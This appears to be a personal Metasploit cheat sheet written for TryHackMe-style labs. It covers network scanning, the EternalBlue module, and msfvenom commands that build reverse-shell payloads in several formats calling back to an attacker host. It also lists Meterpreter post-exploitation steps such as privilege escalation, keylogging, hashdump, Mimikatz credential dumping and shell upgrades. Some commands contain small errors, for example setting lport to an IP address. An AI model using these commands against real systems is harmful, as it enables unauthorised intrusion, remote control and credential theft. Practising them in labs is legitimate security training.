# Self Guid to New Attack

## Scanning

`systemctl start postgresql`
`sudo -u postgres msfdb init`
`msfconsole`
`db_status`

> Edit: Change second color to anything than dark

`workspace -a tryhackme`
nmap -sV -vv --script vuln
`db_nmap -sV -p- <target_IP>`
`hosts`
`services`

## Finding vulnerabilities

`search portscan`, `search udp`, `show auxilary`, `show exploits`

`auxiliary/scanner/`

`scanner/discovery/udp_sweep`
`auxiliary/scanner/smb/smb_login`

## Exploit

`msfvenom --list payloads | grep meterpreter`
`exploit/windows/smb/ms17_010_eternalblue`
`set payload windows/x64/shell/reverse_tcp`

**Linux Executable and Linkable Format (elf)**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > rev_shell.elf`

**Windows**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > rev_shell.exe`

**PHP**
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.php`

**ASP**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f asp > rev_shell.asp`

**Python**
`msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.py`

`exploit/multi/handler`
`set payload linux/x86/meterpreter/reverse_tcp`
`set lhost=<attacker_ip>`then`set lport=<attacker_ip>`

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`

## Meterpreter

`sessions`
`sessions -i <session_id>`

`tasklist /m /fi "pid eq <pid_of_meterpreter>"`

- `use priv` you need to run prior to using `getsystem`.
- `getsystem` attempt to elevate your privilege to that of local system.
- `getuid` display the user with which it is currently running.
- `ps` list running processes with their PIDs.
- `migrate <pid>` migrate to another process to interact with it (for ex. word.exe to get the key strokes using `keyscan_start`). Note: Migrating to another process may help you to have a more stable Meterpreter session. But be careful, you may lose your user privileges if you migrate from a higher privileged (system) user to a process started by a lower privileged (webserver) user and may not be able to gain them back.
- `hashdump` list the content of the SAM database for windows systems. These passwords are stored in the NTLM format. You cna use http://crackstation.net/ to decipher the hashes.
- `search -f <file_name>` useful to locate files with potentially juicy information (for ex. `search -f *.txt`)
- `shell` launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.
- `load python` run Python code natively on target machine.
- `load kiwi` or `load Mimikatz` credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets.

### Shell to meterpreter

`sessions -u <session_id>` Upgrading shells to Meterpreter

`use post/multi/manage/shell_to_meterpreter`
hosts -R
set session <session_number>
